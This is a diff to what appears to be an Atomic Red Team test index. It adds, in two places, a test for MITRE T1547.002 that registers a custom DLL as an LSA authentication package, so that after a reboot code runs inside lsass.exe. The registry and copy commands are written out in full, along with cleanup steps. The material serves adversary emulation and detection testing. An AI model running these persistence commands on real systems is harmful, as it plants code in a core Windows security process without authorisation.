@@ -11206,7 +11206,25 @@ privilege-escalation:
       - Administrator
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1547.002
+    atomic_tests:
+    - name: Authentication Package
+      auto_generated_guid: be2590e8-4ac3-47ac-b4b5-945820f2fbe9
+      description: |
+        Establishes persistence using a custom authentication package for the Local Security Authority (LSA).
+        After a reboot, Notepad.exe will be executed as child process of lsass.exe.
+        Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          Copy-Item $PathToAtomicsFolder\T1547.002\bin\package.dll C:\Windows\System32\
+          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0"\0"package.dll" /f
+        cleanup_command: |
+          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f
+          rm -force C:\windows\system32\package.dll
+        name: powershell
+        elevation_required: true
   T1547:
     technique:
       id: attack-pattern--1ecb2399-e8ba-4f6b-8ba7-5c27d49405cf
@@ -41041,7 +41059,25 @@ persistence:
       - Administrator
       x_mitre_is_subtechnique: true
       x_mitre_version: '1.0'
-    atomic_tests: []
+      identifier: T1547.002
+    atomic_tests:
+    - name: Authentication Package
+      auto_generated_guid: be2590e8-4ac3-47ac-b4b5-945820f2fbe9
+      description: |
+        Establishes persistence using a custom authentication package for the Local Security Authority (LSA).
+        After a reboot, Notepad.exe will be executed as child process of lsass.exe.
+        Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package
+      supported_platforms:
+      - windows
+      executor:
+        command: |
+          Copy-Item $PathToAtomicsFolder\T1547.002\bin\package.dll C:\Windows\System32\
+          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0"\0"package.dll" /f
+        cleanup_command: |
+          reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f
+          rm -force C:\windows\system32\package.dll
+        name: powershell
+        elevation_required: true
   T1197:
     technique:
       id: attack-pattern--c8e87b83-edbb-48d4-9295-4974897525b7
